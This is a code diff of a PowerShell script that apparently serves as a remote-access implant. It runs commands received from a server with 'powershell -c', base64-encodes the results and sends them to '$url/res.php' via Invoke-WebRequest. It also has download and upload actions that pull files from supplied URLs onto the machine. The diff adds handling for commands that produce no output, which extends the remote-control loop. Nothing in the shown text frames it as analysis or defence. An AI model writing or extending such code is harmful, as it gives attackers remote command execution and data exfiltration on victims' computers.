@@ -62,9 +62,16 @@ if ($act -eq "run")
         continue
     }
 	$Output = (powershell -c $cmd 2>&1)
+	if ([string]::IsNullOrWhiteSpace($Output))
+    {	
+	$EncOutputBytes = [System.Text.Encoding]::UTF8.GetBytes("Command executed but no Output")
+        $EncOutput = [System.Convert]::ToBase64String($EncOutputBytes)
+	$gimme=(Invoke-WebRequest "$url/res.php?res=$EncOutput&id=$id")
+        continue
+    }
 	$EncOutputBytes = [System.Text.Encoding]::UTF8.GetBytes($Output)
         $EncOutput = [System.Convert]::ToBase64String($EncOutputBytes)
-       $gimme=(Invoke-WebRequest "$url/res.php?res=$EncOutput&id=$id")
+        $gimme=(Invoke-WebRequest "$url/res.php?res=$EncOutput&id=$id")
 }  
 if ($act -eq "download")
 {
@@ -106,7 +113,6 @@ if ($act -eq "upload")
 $urldl = ($cmd -split ':',5)[2,3]
 $urldl = ($urldl -join ":")
 
-
 	if ([string]::IsNullOrWhiteSpace($urldl))
     {
 	
@@ -126,9 +132,6 @@ $resup=(Invoke-WebRequest "$url/res.php?res=$Encd&id=$id")
 $down= (Invoke-WebRequest -Uri $urldl -OutFile $path)
 
 
-
 }
-
 }
- 
 }
